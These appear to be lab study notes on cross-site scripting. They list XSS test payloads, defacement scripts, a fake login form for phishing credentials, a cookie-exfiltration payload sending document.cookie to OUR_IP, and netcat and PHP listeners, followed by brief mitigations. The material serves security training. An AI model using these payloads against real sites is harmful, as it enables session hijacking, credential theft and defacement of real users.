# Cross-Site Scripting (XSS)

## 🎯 Main Idea
- XSS lets an attacker inject malicious JavaScript that executes in a victim's browser in the context of a vulnerable web app.
- Goal: understand the three XSS types, discover injection points, and weaponize them for defacement, phishing, and session hijacking.

## 💥 Attack / Exploit Vectors
### Stored (Persistent) XSS
- Payload is saved on the server (e.g. a comment) and runs for every visitor.
- **Commands**
  - `<script>alert(window.origin)</script>` — basic test payload (confirms execution + origin)
  - `<plaintext>` — basic test payload
  - `<script>print()</script>` — payload that avoids alert-based filters
  - `<img src="" onerror=alert(window.origin)>` — HTML/attribute-based payload when `<script>` is filtered
### Reflected XSS
- Non-persistent; payload reflected from the request (e.g. error message) back into the response.
- **Commands**
  - `<script>alert(window.origin)</script>` — reflected via a vulnerable GET/POST parameter
### DOM-based XSS
- Client-side JS writes attacker-controlled input (source) into a dangerous sink; never reaches the server.
- **Commands**
  - `#"><img src=/ onerror=alert(document.cookie)>` — payload via a DOM source (e.g. `document.write`, `innerHTML`, `location.hash`)
- Key idea: trace Source (e.g. `document.URL`, `location`) to Sink (e.g. `innerHTML`, `eval`, `document.write`)
### XSS Discovery
- Find injectable parameters via automated scanners, manual testing, or source review.
- **Commands**
  - `python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"` — automated XSS discovery with XSStrike
  - Manual: inject payloads into every input/parameter; Code review: inspect how input flows to output
### Defacing
- Use stored XSS to alter the page appearance for all visitors.
- **Commands**
  - `<script>document.body.style.background = "#141d2b"</script>` — change background colour
  - `<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>` — change background image
  - `<script>document.title = 'HackTheBox Academy'</script>` — change page title
  - `<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>` — overwrite the page body
  - `<script>document.getElementById('urlform').remove();</script>` — remove an HTML element
### Phishing (Credential Stealing)
- Inject a fake login form that posts credentials to an attacker-controlled server.
- **Commands**
  - `document.write('<fake login form>')` + `document.getElementById('urlform').remove();` — inject form and clean up original page
  - `sudo php -S 0.0.0.0:80` — host a PHP page to capture submitted credentials
  - `sudo nc -lvnp 80` — netcat listener to catch incoming data
### Session Hijacking (Cookie Theft)
- Steal victim session cookies via a remote script; useful for blind XSS.
- **Commands**
  - `<script src="http://OUR_IP/script.js"></script>` — load a remote attacker script (also used for blind XSS detection)
  - `<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>` — exfiltrate cookies to our server
  - `sudo nc -lvnp 80` — listener to receive stolen cookies
  - `sudo php -S 0.0.0.0:80` — PHP server to log received cookies

## 🛠️ Key Tools & Concepts
- XSStrike — automated XSS discovery/fuzzing tool
- netcat (`nc`) — listener for captured data/cookies
- PHP built-in server (`php -S`) — host scripts / capture endpoints
- Source & Sink — core DOM XSS analysis concept
- Blind XSS — payload executes somewhere the attacker cannot see (detected via callbacks)
- `document.cookie`, `window.origin` — key JS objects used in payloads

## 🛡️ Mitigations
- Front-end: validate input, use a Content Security Policy (CSP)
- Back-end: context-aware output encoding/escaping, input validation and sanitization
- Set HttpOnly flag on cookies to prevent JS access (mitigates cookie theft)
